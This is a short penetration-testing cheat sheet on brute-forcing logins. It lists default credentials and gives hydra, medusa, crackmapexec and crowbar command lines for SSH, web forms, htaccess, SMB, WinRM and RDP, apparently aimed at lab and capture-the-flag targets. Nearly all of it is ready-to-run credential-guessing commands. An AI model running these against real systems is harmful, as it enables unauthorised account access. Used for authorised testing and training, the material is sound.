# Brute Force List

## Before Brute Force Rules

### Default Credentials

Always try default credentials first. Often, you will find that default configurations use the same password as the username:

```
admin:admin
username:username
```

Search on the internet to find the default credentials of a service or application:

```
default credentials of <service_name_here>
<service_name_here> default credentials
```

SecLists has a nice default credentials wordlists:

{% embed url="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv" %}

## SSH

```shell
hydra -l username -P rockyou.txt ssh://<IP>
```

## HTTP POST

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong"
```

```
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```

### htaccess

```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

## SMB

```
hydra -L users.txt -p password smb://10.10.10.169
```

```
hydra -l username -P passwords.txt smb://10.10.10.169
```

```
hydra -L users.txt -P passwords.txt smb://10.10.10.169
```

```
crackmapexec smb 10.10.11.129 -u usernames.txt -p password123 --continue-on-success
```

```
crackmapexec smb 10.10.11.129 -u users.txt -p passwords.txt --continue-on-success | grep -F '[+]
```

## WinRM

```shell
crackmapexec winrm 10.10.140.97 -u username -p passwords.txt
```

## RDP

```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```
